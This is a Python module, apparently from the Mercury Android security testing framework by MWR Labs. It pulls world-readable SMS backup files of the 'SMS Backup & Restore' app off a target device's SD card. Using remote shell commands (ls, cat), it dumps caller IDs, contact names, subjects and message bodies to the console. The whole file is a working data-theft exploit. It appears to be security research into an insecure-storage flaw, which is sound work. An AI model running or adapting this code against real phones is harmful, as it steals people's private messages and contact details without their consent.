from merc.lib.modules import Module
import re
class com_riteshsahu_SMSBackupRestore(Module):
    """Grabs World Readable SMS Backups from the SDCard for the application 'SMS Backup & Restore'(com.riteshsahu.SMSBackupRestore)
https://play.google.com/store/apps/details?id=com.riteshsahu.SMSBackupRestore
Henry Hoggard - MWRLabs"""
    
    def __init__(self, *args, **kwargs):
        Module.__init__(self, *args, **kwargs)
        self.path = ["exploit", "pilfer", "thirdparty"]

    def execute(self, session, _arg):
        reFindCallerID = re.compile('address="(.*)" date="')
        reFindSubject = re.compile('subject="(.*)" body="')
        reFindContact = re.compile('contact_name="(.*)" />')
        reFindMessage = re.compile('body="(.*)" toa="')
        
        
        
        result = session.executeCommand("shell","executeSingleCommand", {"args":"ls /mnt/sdcard/SMSBackupRestore/"}).getPaddedErrorOrData()

        for r in result.split("\n"):
            if r != "":
                if r != "sms.xsl":
                    print 'mercury> Downloading ' + r
                    content = session.executeCommand("shell", "executeSingleCommand", {"args": "cat /mnt/sdcard/SMSBackupRestore/"+r}).getPaddedErrorOrData()
                    callerIDs = re.findall(reFindCallerID,content)
                    contact = re.findall(reFindContact, content)
                    subject = re.findall(reFindSubject, content)
                    body = re.findall(reFindMessage, content)
                
                   
                    print 'mercury> Dumping SMS.............'
                    print '==================================================='
                    for i in range(len(callerIDs)):
                        
                        print 'Caller ID = '+ callerIDs[i]
                        print 'Contact = ' + contact[i]
                        print 'Subject = '+ subject[i]
                        print 'Body = ' + body[i]
                        print '-------------------------------------------------'
                        
                 

                    
   
